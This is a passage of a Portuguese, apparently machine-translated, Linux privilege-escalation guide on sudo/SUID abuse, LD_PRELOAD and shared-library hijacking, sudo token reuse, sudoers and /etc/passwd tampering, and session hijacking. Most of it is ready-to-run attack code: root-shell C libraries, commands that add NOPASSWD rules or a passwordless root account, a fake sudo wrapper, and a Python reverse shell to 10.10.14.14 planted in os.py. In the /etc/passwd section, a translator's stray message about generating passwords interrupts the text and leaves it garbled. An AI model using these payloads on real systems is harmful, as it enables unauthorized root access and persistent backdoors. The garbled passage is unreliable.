[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) com o parâmetro `-a` também tenta brute-forcear usuários.

## Abusos de PATH gravável

### $PATH

Se você descobrir que pode **escrever dentro de alguma pasta do $PATH** pode ser capaz de escalar privilégios criando uma backdoor dentro da pasta gravável com o nome de algum comando que será executado por outro usuário (idealmente root) e que **não seja carregado a partir de uma pasta localizada antes** da sua pasta gravável no $PATH.

### SUDO and SUID

Você pode ter permissão para executar algum comando usando sudo ou eles podem ter o bit suid. Verifique isso usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alguns **comandos inesperados permitem que você leia e/ou escreva arquivos ou até execute um comando.** Por exemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

A configuração do sudo pode permitir que um usuário execute algum comando com os privilégios de outro usuário sem conhecer a senha.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Neste exemplo o usuário `demo` pode executar `vim` como `root`; agora é trivial obter uma shell adicionando um ssh key no root directory ou chamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta diretiva permite ao usuário **definir uma variável de ambiente** enquanto executa algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este exemplo, **baseado na HTB machine Admirer**, estava **vulnerável** a **PYTHONPATH hijacking** para carregar uma biblioteca python arbitrária enquanto executava o script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Se sudoers preserva `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), você pode aproveitar o comportamento de inicialização não interativa do Bash para executar código arbitrário como root ao invocar um comando permitido.

- Por que funciona: Para shells não interativos, Bash avalia `$BASH_ENV` e o arquivo é sourced antes de executar o script alvo. Muitas regras do sudo permitem executar um script ou um shell wrapper. Se `BASH_ENV` for preservado pelo sudo, seu arquivo será sourced com privilégios de root.

- Requisitos:
- Uma regra do sudo que você possa executar (qualquer alvo que invoque `/bin/bash` de forma não interativa, ou qualquer bash script).
- `BASH_ENV` presente em `env_keep` (verifique com `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Endurecimento:
- Remova `BASH_ENV` (e `ENV`) de `env_keep`, prefira `env_reset`.
- Evite wrappers de shell para comandos permitidos pelo sudo; use binários mínimos.
- Considere registro de I/O do sudo e alertas quando variáveis de ambiente preservadas forem usadas.

### Caminhos que permitem bypass de execução do sudo

**Jump** para ler outros arquivos ou usar **symlinks**. Por exemplo no arquivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se um **wildcard** for usado (\*), é ainda mais fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/Binário SUID sem caminho do comando

Se a **permissão sudo** for dada para um único comando **sem especificar o caminho**: _hacker10 ALL= (root) less_ você pode explorá-la alterando a variável PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica também pode ser usada se um binário **suid** **executa outro comando sem especificar o caminho para ele (sempre verifique com** _**strings**_ **o conteúdo de um binário SUID estranho)**.

[Payload examples to execute.](payloads-to-execute.md)

### Binário SUID com caminho do comando

Se o binário **suid** **executa outro comando especificando o caminho**, então, você pode tentar **exportar uma função** com o mesmo nome do comando que o arquivo suid está chamando.

Por exemplo, se um binário suid chama _**/usr/sbin/service apache2 start**_, você deve tentar criar a função e exportá-la:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Então, quando você chamar o binário suid, essa função será executada

### LD_PRELOAD & **LD_LIBRARY_PATH**

A variável de ambiente **LD_PRELOAD** é usada para especificar uma ou mais bibliotecas compartilhadas (.so files) a serem carregadas pelo loader antes de todas as outras, incluindo a biblioteca C padrão (`libc.so`). Esse processo é conhecido como pré-carregamento de uma biblioteca.

No entanto, para manter a segurança do sistema e impedir que esse recurso seja explorado, especialmente com executáveis suid/sgid, o sistema impõe certas condições:

- O loader desconsidera **LD_PRELOAD** para executáveis onde o ID de usuário real (_ruid_) não corresponde ao ID de usuário efetivo (_euid_).
- Para executáveis com suid/sgid, apenas bibliotecas em caminhos padrão que também sejam suid/sgid são pré-carregadas.

A elevação de privilégios pode ocorrer se você tiver a capacidade de executar comandos com `sudo` e a saída de `sudo -l` incluir a instrução **env_keep+=LD_PRELOAD**. Essa configuração permite que a variável de ambiente **LD_PRELOAD** persista e seja reconhecida mesmo quando comandos são executados com `sudo`, potencialmente levando à execução de código arbitrário com privilégios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
Salvar como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Então **compile-o** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **escalate privileges** em execução
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Um privesc semelhante pode ser abusado se o atacante controlar a env variable **LD_LIBRARY_PATH** porque ele controla o caminho onde as bibliotecas serão procuradas.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Ao encontrar um binary com permissões **SUID** que pareça incomum, é uma boa prática verificar se ele está carregando arquivos **.so** corretamente. Isso pode ser verificado executando o seguinte comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por exemplo, encontrar um erro como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugere uma possibilidade de exploração.

Para explorar isso, procede-se criando um arquivo C, por exemplo _"/path/to/.config/libcalc.c"_, contendo o seguinte código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, uma vez compilado e executado, visa elevar privilégios manipulando permissões de arquivos e executando um shell com privilégios elevados.

Compile o arquivo C acima em um shared object (.so) com:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, executar o binário SUID afetado deve acionar o exploit, permitindo um possível comprometimento do sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Agora que encontramos um SUID binary que carrega uma library de uma pasta onde podemos escrever, vamos criar a library nessa pasta com o nome necessário:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se você receber um erro como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
isso significa que a biblioteca que você gerou precisa ter uma função chamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) é uma lista selecionada de binários Unix que podem ser explorados por um atacante para contornar restrições de segurança locais. [**GTFOArgs**](https://gtfoargs.github.io/) é o mesmo, mas para casos onde você pode **apenas injetar argumentos** em um comando.

O projeto reúne funções legítimas de binários Unix que podem ser abusadas para sair de shells restritos, escalar ou manter privilégios elevados, transferir arquivos, spawn bind and reverse shells, e facilitar outras tarefas de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Se você pode executar `sudo -l`, você pode usar a ferramenta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar se ela encontra maneiras de explorar alguma regra do sudo.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requisitos para escalar privilégios:

- Você já tem um shell como o usuário "_sampleuser_"
- "_sampleuser_" tenha **usado `sudo`** para executar algo nos **últimos 15mins** (por padrão essa é a duração do token sudo que nos permite usar `sudo` sem inserir nenhuma senha)
- `cat /proc/sys/kernel/yama/ptrace_scope` é 0
- `gdb` esteja acessível (você possa fazer upload dele)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- O **segundo exploit** (`exploit_v2.sh`) criará um shell sh em _/tmp_ **de propriedade do root com setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- O **terceiro exploit** (`exploit_v3.sh`) irá **criar um arquivo sudoers** que torna os **sudo tokens** eternos e permite que **todos os usuários** usem sudo
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Se você tiver **write permissions** na pasta ou em qualquer um dos arquivos criados dentro dela você pode usar o binário [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **criar um sudo token para um usuário e PID**.\
Por exemplo, se você puder sobrescrever o arquivo _/var/run/sudo/ts/sampleuser_ e tiver um shell como esse usuário com PID 1234, você pode **obter privilégios sudo** sem precisar saber a senha fazendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

O arquivo `/etc/sudoers` e os arquivos dentro de `/etc/sudoers.d` configuram quem pode usar `sudo` e como. Esses arquivos **por padrão só podem ser lidos pelo usuário root e pelo grupo root**.\
**Se** você conseguir **ler** este arquivo poderá **obter informações interessantes**, e se puder **escrever** qualquer arquivo será capaz de **escalar privilégios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se você consegue escrever, pode abusar desta permissão
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Outra maneira de abusar dessas permissões:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Existem algumas alternativas ao binário `sudo`, como `doas` do OpenBSD. Lembre-se de verificar sua configuração em `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Se você sabe que um **usuário geralmente se conecta a uma máquina e usa `sudo`** para escalar privilégios e você obteve um shell dentro desse contexto de usuário, você pode **criar um novo executável sudo** que irá executar seu código como root e depois o comando do usuário. Em seguida, **modifique o $PATH** do contexto do usuário (por exemplo adicionando o novo caminho em .bash_profile) para que, quando o usuário executar sudo, seu executável sudo seja executado.

Observe que se o usuário usa um shell diferente (não bash) você precisará modificar outros arquivos para adicionar o novo caminho. Por exemplo[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Você pode encontrar outro exemplo em [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou executando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteca Compartilhada

### ld.so

O arquivo `/etc/ld.so.conf` indica **de onde vêm os arquivos de configuração carregados**. Tipicamente, este arquivo contém o seguinte caminho: `include /etc/ld.so.conf.d/*.conf`

Isso significa que os arquivos de configuração em `/etc/ld.so.conf.d/*.conf` serão lidos. Esses arquivos de configuração **apontam para outras pastas** onde **bibliotecas** serão **procuradas**. Por exemplo, o conteúdo de `/etc/ld.so.conf.d/libc.conf` é `/usr/local/lib`. **Isso significa que o sistema irá buscar por bibliotecas dentro de `/usr/local/lib`**.

Se por algum motivo **um usuário tem permissões de escrita** em qualquer um dos caminhos indicados: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualquer arquivo dentro de `/etc/ld.so.conf.d/` ou qualquer pasta referenciada pelo arquivo de configuração em `/etc/ld.so.conf.d/*.conf` ele pode ser capaz de escalate privileges.\
Confira **how to exploit this misconfiguration** na página a seguir:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Ao copiar a lib para `/var/tmp/flag15/`, ela será usada pelo programa nesse local conforme especificado na variável `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Em seguida, crie uma biblioteca maliciosa em `/var/tmp` com `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacidades

Linux capabilities fornecem um **subconjunto dos privilégios root disponíveis para um processo**. Isso efetivamente fragmenta os privilégios root **em unidades menores e distintas**. Cada uma dessas unidades pode então ser concedida de forma independente a processos. Dessa forma o conjunto completo de privilégios é reduzido, diminuindo os riscos de exploração.\
Leia a página a seguir para **aprender mais sobre capabilities e como abusar delas**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permissões de diretório

Em um diretório, o **bit de "execute"** implica que o usuário afetado pode "**cd**" para dentro da pasta.\
O **bit "read"** implica que o usuário pode **listar** os **arquivos**, e o **bit "write"** implica que o usuário pode **excluir** e **criar** novos **arquivos**.

## ACLs

Access Control Lists (ACLs) representam a camada secundária de permissões discricionárias, capazes de **sobrepor** as permissões tradicionais ugo/rwx. Essas permissões aumentam o controle sobre o acesso a arquivos ou diretórios ao permitir ou negar direitos a usuários específicos que não são os proprietários ou não fazem parte do grupo. Esse nível de **granularidade** garante um gerenciamento de acesso mais preciso. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dê** ao usuário "kali" permissões de leitura e escrita sobre um arquivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obter** arquivos com ACLs específicas do sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sessões de shell abertas

Em **versões antigas** você pode **hijack** alguma sessão **shell** de um usuário diferente (**root**).\
Nas **versões mais recentes** você poderá **connect** a screen sessions apenas do **seu próprio usuário**. No entanto, você pode encontrar **informações interessantes dentro da sessão**.

### screen sessions hijacking

**Listar screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Anexar a uma sessão**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Sequestro de sessões tmux

Isso era um problema em **versões antigas do tmux**. Eu não consegui sequestrar uma sessão tmux (v2.1) criada pelo root como um usuário não privilegiado.

**Listar sessões tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Anexar a uma sessão**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Veja **Valentine box from HTB** como exemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Todas as chaves SSL e SSH geradas em sistemas baseados em Debian (Ubuntu, Kubuntu, etc) entre setembro de 2006 e 13 de maio de 2008 podem ser afetadas por esse bug.\
Esse bug ocorre ao criar uma nova chave ssh nesses sistemas, pois **apenas 32,768 variações eram possíveis**. Isso significa que todas as possibilidades podem ser calculadas e **tendo a chave pública ssh você pode buscar a chave privada correspondente**. Você pode encontrar as possibilidades calculadas aqui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Especifica se a autenticação por senha é permitida. O padrão é `no`.
- **PubkeyAuthentication:** Especifica se a autenticação por chave pública é permitida. O padrão é `yes`.
- **PermitEmptyPasswords**: Quando a autenticação por senha está permitida, especifica se o servidor permite login em contas com senhas vazias. O padrão é `no`.

### PermitRootLogin

Especifica se o root pode fazer login usando ssh, o padrão é `no`. Valores possíveis:

- `yes`: root pode entrar usando senha e chave privada
- `without-password` or `prohibit-password`: root só pode entrar com chave privada
- `forced-commands-only`: root pode entrar apenas usando chave privada e se a opção de comandos estiver especificada
- `no` : não

### AuthorizedKeysFile

Especifica arquivos que contêm as chaves públicas que podem ser usadas para autenticação de usuário. Pode conter tokens como `%h`, que serão substituídos pelo diretório home. **Você pode indicar caminhos absolutos** (começando em `/`) ou **caminhos relativos a partir do home do usuário**. Por exemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Essa configuração indicará que, se você tentar fazer login com a chave **private** do usuário "**testusername**", o ssh irá comparar o public key da sua chave com as que estão localizadas em `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

O SSH agent forwarding permite que você **use your local SSH keys instead of leaving keys** (sem passphrases!) deixe-as no seu servidor. Assim, você poderá **jump** via ssh **to a host** e, a partir daí, **jump to another** host **using** a **key** localizada no seu **initial host**.

Você precisa definir essa opção em `$HOME/.ssh.config` assim:
```
Host example.com
ForwardAgent yes
```
Note que se `Host` for `*` toda vez que o usuário conectar-se a uma máquina diferente, essa máquina poderá acessar as chaves (o que é um problema de segurança).

O arquivo `/etc/ssh_config` pode **sobrescrever** essas **opções** e permitir ou negar essa configuração.\
O arquivo `/etc/sshd_config` pode **permitir** ou **negar** ssh-agent forwarding com a keyword `AllowAgentForwarding` (default is allow).

Se você descobrir que Forward Agent está configurado em um ambiente, leia a página a seguir, pois **pode ser possível abusá-lo para escalar privilégios**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Arquivos Interessantes

### Profiles files

O arquivo `/etc/profile` e os arquivos em `/etc/profile.d/` são **scripts que são executados quando um usuário inicia um novo shell**. Portanto, se você puder **escrever ou modificar qualquer um deles você pode escalar privilégios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se algum script de perfil estranho for encontrado você deve verificá-lo em busca de **detalhes sensíveis**.

### Arquivos Passwd/Shadow

Dependendo do SO os arquivos `/etc/passwd` e `/etc/shadow` podem estar usando um nome diferente ou pode haver um backup. Portanto é recomendado **encontrar todos eles** e **verificar se você pode lê-los** para ver **se há hashes** dentro dos arquivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Em algumas ocasiões, você pode encontrar **password hashes** dentro do arquivo `/etc/passwd` (ou equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd gravável

Primeiro, gere uma senha com um dos seguintes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Preciso do conteúdo do arquivo src/linux-hardening/privilege-escalation/README.md para poder traduzi-lo. Deseja também que eu:

- Gere uma senha forte (por exemplo 16 caracteres: maiúsculas, minúsculas, dígitos e símbolos) e a adicione ao final do README como credencial em texto claro?
- Ou prefira que eu adicione apenas o comando para criar o usuário `hacker` e configurar a senha (por exemplo: useradd -m hacker && echo 'hacker:SenhaGerada' | sudo chpasswd), sem exibir a senha em claro?

Responda qual opção prefere e, se quiser, informe requisitos da senha (comprimento, caracteres permitidos). Depois eu faço a tradução do README.md e adiciono a seção solicitada.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ex.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Você agora pode usar o comando `su` com `hacker:hacker`

Alternativamente, você pode usar as seguintes linhas para adicionar um usuário dummy sem senha.\
AVISO: isso pode degradar a segurança atual da máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: Em plataformas BSD `/etc/passwd` está localizado em `/etc/pwd.db` e `/etc/master.passwd`, também o `/etc/shadow` é renomeado para `/etc/spwd.db`.

Você deve verificar se pode **escrever em alguns arquivos sensíveis**. Por exemplo, você consegue escrever em algum **arquivo de configuração de serviço**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por exemplo, se a máquina estiver executando um servidor **tomcat** e você puder **modificar o arquivo de configuração do serviço Tomcat dentro de /etc/systemd/,** então você pode modificar as linhas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Seu backdoor será executado na próxima vez que o tomcat for iniciado.

### Verificar pastas

As pastas a seguir podem conter backups ou informações interessantes: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Provavelmente você não conseguirá ler a última, mas tente)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Localização Estranha/Arquivos Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Arquivos modificados nos últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Arquivos DB do Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml arquivos
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Arquivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries no PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Arquivos web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Cópias de segurança**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Arquivos conhecidos que contêm passwords

Leia o código do [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ele procura **vários arquivos possíveis que podem conter passwords**.\
**Outra ferramenta interessante** que você pode usar para isso é: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) que é uma aplicação de código aberto usada para recuperar muitos passwords armazenados em um computador local para Windows, Linux & Mac.

### Logs

Se você conseguir ler logs, pode ser capaz de encontrar **informações interessantes/confidenciais no seu interior**. Quanto mais estranho for o log, mais interessante provavelmente será.\
Além disso, alguns "**ruim**" configurados (backdoored?) **audit logs** podem permitir que você **grave passwords** dentro dos audit logs como explicado neste post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **ler logs, o grupo** [**adm**](interesting-groups-linux-pe/index.html#adm-group) será realmente útil.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Busca/Regex de Creds Genéricas

Você também deve checar por arquivos contendo a palavra "**password**" no **nome** ou dentro do **conteúdo**, e também checar por IPs e emails dentro de logs, ou hashes regexps.\
Não vou listar aqui como fazer tudo isso, mas se estiver interessado você pode checar as últimas verificações que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) realiza.

## Arquivos graváveis

### Python library hijacking

Se você souber **de onde** um script python será executado e você **puder escrever dentro** dessa pasta ou puder **modificar python libraries**, você pode modificar a biblioteca OS e backdoor it (se você puder escrever onde o script python será executado, copie e cole a biblioteca os.py).

Para **backdoor the library** apenas adicione ao final da biblioteca os.py a seguinte linha (altere IP e PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploração

